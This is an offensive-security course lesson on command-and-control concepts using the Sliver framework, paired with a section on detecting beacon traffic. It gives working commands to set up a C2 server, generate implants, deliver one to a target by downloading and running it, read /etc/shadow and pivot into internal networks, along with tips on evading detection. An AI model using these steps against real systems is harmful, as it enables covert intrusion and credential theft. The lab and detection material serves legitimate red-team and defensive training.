---
title: "C2 Concepts and Sliver Lab"
tags: [C2, command-and-control, Sliver, beaconing, implant, HTTPS-C2,
       infrastructure, T1071, T1102, T1573, ATT&CK, post-exploitation]
module: 04-BroadSurface-04
day: 242
related_topics:
  - Post-Exploitation Basics (Day 241)
  - Living off the Land (Day 243)
  - Infrastructure Detection and Hardening (Day 244)
  - Red Team Operations (Day 305)
---

# Day 242 — C2 Concepts and Sliver Lab

> "A netcat shell is not a C2. It is a toy. It breaks when the connection
> drops. It has no encryption. It has no persistence. It cannot do anything
> a basic firewall does not block. A real C2 framework — Sliver, Havoc, Cobalt
> Strike — gives you reliability, stealth, and control at scale. Understand
> what makes it work before you depend on it in an engagement."
>
> — Ghost

---

## Goals

By the end of today's session you will be able to:

1. Explain the architecture of a C2 framework: listener, implant, operator.
2. Deploy a Sliver C2 server and configure an HTTPS listener.
3. Generate an implant, deliver it to a target, and establish a beacon.
4. Execute basic post-exploitation commands through the C2 session.
5. Describe what C2 traffic looks like to a network defender and how
   defenders detect it.

**Time budget:** 5 hours.

---

## Prerequisites

| Requirement | Covered in |
|---|---|
| Post-exploitation concepts | Day 241 |
| Basic networking (HTTPS, DNS) | Days 1–8 |
| Linux administration | Days 9–16 |

---

## Part 1 — C2 Architecture

### Components

A C2 framework has three components:

```
Operator (you)
    │
    │ CLI/UI (Sliver client, Cobalt Strike GUI)
    │
    ▼
C2 Server (Sliver teamserver)
    │
    │ HTTPS / DNS / TCP / mTLS
    │
    ▼
Implant (beacon / shell / agent)
    running on the compromised target
    beacons out to the C2 server on a schedule
```

### Implant vs. Shell

| Property | Raw Shell (nc, bash) | Implant (beacon) |
|---|---|---|
| Direction | Inbound (attacker → target) | Outbound (target → C2) |
| Firewall traversal | Blocked by egress filters | Bypasses most egress via HTTPS |
| Persistence after reboot | None | Built-in sleep+reconnect |
| Encryption | None | TLS or custom protocol |
| Detection | Easy (outbound shell connections) | Harder (looks like HTTPS web traffic) |
| Multi-operator | No | Yes (all operators share sessions) |
| Session management | Manual | Automatic reconnect, sleep intervals |

### Beaconing vs. Interactive

- **Beacon mode:** implant sleeps for a configurable interval (e.g. 60 seconds),
  wakes up, checks in with the C2 server, executes any queued tasks, sends results
  back, sleeps again. Stealthier — less constant traffic.
- **Interactive mode (session):** maintains a persistent connection. Real-time.
  Higher network visibility.

**ATT&CK:** T1071.001 (Application Layer Protocol: Web Protocols), T1573 (Encrypted Channel)

---

## Part 2 — Sliver C2 Setup

Sliver is an open-source C2 framework maintained by BishopFox. Free, actively
maintained, supports HTTPS, mTLS, DNS, and WireGuard C2 channels.

```bash
# On your attacker / C2 server (Linux):
# Install Sliver server
curl https://sliver.sh/install | sudo bash

# Or manually:
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux -O /usr/local/bin/sliver-server
chmod +x /usr/local/bin/sliver-server

# Start the Sliver server (listens on port 31337 for operator connections)
sliver-server

# In a new terminal — connect the Sliver client:
sliver-client

# You will see the Sliver shell:
# [server] sliver >
```

---

## Part 3 — Configure a Listener

```
# In the Sliver shell:

# HTTPS listener (most common — blends with web traffic)
https --lhost 0.0.0.0 --lport 443 --domain <your-domain-or-ip>

# DNS listener (bypasses HTTP inspection — requires domain with NS record)
# dns --domains c2.yourdomain.com

# mTLS listener (mutual TLS — more secure, harder to detect)
# mtls --lhost 0.0.0.0 --lport 8888

# Verify listeners are running:
jobs
```

---

## Part 4 — Generate an Implant

```
# Generate a beacon (periodic check-in) for Linux x64:
generate beacon \
  --http https://<c2-ip>:<port> \
  --os linux \
  --arch amd64 \
  --format elf \
  --seconds 60 \
  --jitter 15 \
  --save /tmp/beacon

# Parameters:
# --seconds 60  → sleep 60 seconds between check-ins
# --jitter 15   → randomise sleep by ±15% (anti-detection)
# --format elf  → Linux executable (exe for Windows, dll for DLL injection)

# Generate for Windows:
generate beacon \
  --http https://<c2-ip>:<port> \
  --os windows \
  --arch amd64 \
  --format exe \
  --seconds 120 \
  --jitter 30 \
  --save /tmp/beacon.exe

# List generated implants:
implants
```

---

## Part 5 — Deliver and Execute the Implant

```bash
# Transfer to target (via existing shell access, SSRF, web upload, etc.)
python3 -m http.server 8000  # on attacker
# On target:
wget http://<attacker-ip>:8000/beacon -O /tmp/svc && chmod +x /tmp/svc
/tmp/svc &  # run in background

# The beacon checks in after 60 seconds
# In the Sliver operator shell:
# [*] Beacon <NAME> (<ID>) XXXXXXXX - <OS> (target-hostname)
```

---

## Part 6 — Basic Post-Exploitation via C2

```
# List active sessions and beacons:
beacons
sessions

# Interact with a beacon (tasks queue up, execute at next check-in):
use <beacon-id>

# Basic enumeration:
whoami
getpid
getuid
ps          # process list
netstat     # active connections
ls /home    # directory listing
cat /etc/passwd

# Execute arbitrary commands:
execute -o ls -la /root
execute -o id

# Upload a file to the target:
upload /tmp/pspy64 /tmp/pspy

# Download a file from the target:
download /etc/shadow

# Port forwarding (pivot into internal network):
portfwd add --remote-addr 192.168.1.10 --remote-port 22 --local-port 10022
# Then on attacker: ssh -p 10022 user@localhost → connects through the beacon

# Start an interactive shell (session mode — noisier):
shell

# Inject shellcode into a running process (Windows — advanced):
# migrate <pid>
```

---

## Part 7 — C2 Traffic Detection

### What C2 Looks Like on the Network

Sliver HTTPS C2 traffic characteristics:
- Outbound HTTPS to a non-standard IP (no hostname in SNI, or generic hostname)
- Periodic beaconing with consistent interval + jitter
- Small, uniform request sizes (implant checking in with no tasks)
- User-Agent strings that may not match a real browser
- Certificate self-signed or from a non-standard CA

### Detection Approaches

**Network-level (Zeek/Suricata):**
```
# JA3 fingerprinting — TLS client fingerprints
# Sliver has a known JA3 hash; defenders can block it
# Attackers can modify Sliver's TLS settings to change the JA3

# Periodic outbound connections to the same IP with consistent intervals:
# Zeek analysis:
zcat /path/to/conn.log.gz | zeek-cut id.orig_h id.resp_h service duration | \
  awk '$3 == "ssl" && $4 < 1' | sort | uniq -c | sort -rn | head -20
# High count + short duration + ssl = likely beaconing
```

**Endpoint-level:**
```bash
# Processes making outbound HTTPS connections at regular intervals:
# (Linux) Monitor with ss or netstat:
watch -n 5 'ss -tnp | grep ESTABLISHED | grep ":443"'

# Unusual parent-child process relationships:
# If beacon spawned from a browser: parent=browser → child=ssh/wget/curl → suspicious
```

**SIEM detection pattern (Sigma):**
```yaml
title: C2 Beaconing via Regular HTTPS Intervals
logsource:
  product: zeek
  service: conn
detection:
  selection:
    network.protocol: ssl
    destination.port: 443
  timeframe: 1h
  condition: selection | count() by destination.ip > 50
  # Average 1 per min for 1h = 60+ connections to the same dest → likely beacon
falsepositives:
  - Browser with background sync
  - Update services
level: medium
```

---

## Key Takeaways

1. **Beacons survive firewall rules that kill reverse shells.** Almost every
   corporate firewall allows outbound HTTPS to port 443. A beacon over HTTPS
   is allowed by default; a reverse shell to a non-standard port is often blocked.
2. **Jitter is operational security, not a feature.** Without jitter, periodic
   beacons produce machine-gun-regular intervals that behavioural analytics
   detect easily. With 20% jitter, the interval appears natural.
3. **Session mode is convenient, beacon mode is stealth.** Use beacon mode
   for engagements with active monitoring. Use session mode in lab environments.
   Know when to switch.
4. **JA3/JA3S fingerprinting is a real defensive control.** Each TLS client
   implementation produces a fingerprint. Sliver, Cobalt Strike, and Metasploit
   each have known JA3 hashes. Defenders block them. Operators must know how to
   change them (Sliver supports custom TLS configurations).
5. **C2 infrastructure must be prepared before the engagement.** Domain
   categorisation, SSL certificates, redirectors, and CDN fronting all take
   time to set up and mature. In a real red team operation, C2 infrastructure
   is prepared weeks in advance. In a lab: set up DNS, get a certificate, test
   the redirector before you need it.

---

## Exercises

1. Set up a full Sliver C2 environment: server on one VM, target on another.
   Generate a beacon, deliver it, establish a session. Then: pivot the connection
   through the target to reach a third VM on a different network segment.

2. Capture the Sliver beacon traffic in Wireshark. Analyse: (a) what does the
   TLS certificate look like? (b) What is the JA3 hash? (c) Can you distinguish
   the check-in request from a legitimate HTTPS request by examining packet sizes
   or timing alone?

3. Research: what is DNS C2 and how does it work? What makes it harder to
   detect than HTTPS C2? What defensive controls specifically target DNS-based
   C2 beaconing?

4. Write a detection script in Python that reads a Zeek `conn.log` file and
   identifies potential C2 beaconing: hosts making more than 20 connections
   to the same external IP over port 443 within a 1-hour window with a
   coefficient of variation in inter-packet timing below 0.3 (regular intervals).

---

## Questions

> Add your questions here. Each question gets a Global ID (Q242.1, Q242.2 …).
> Follow-up questions use hierarchical numbering (Q242.1.1, Q242.1.2 …).

---

## Navigation

← Previous: [Day 241 — Post-Exploitation Basics](DAY-0241-Post-Exploitation-Basics.md)
→ Next: [Day 243 — Living off the Land](DAY-0243-Living-off-the-Land.md)
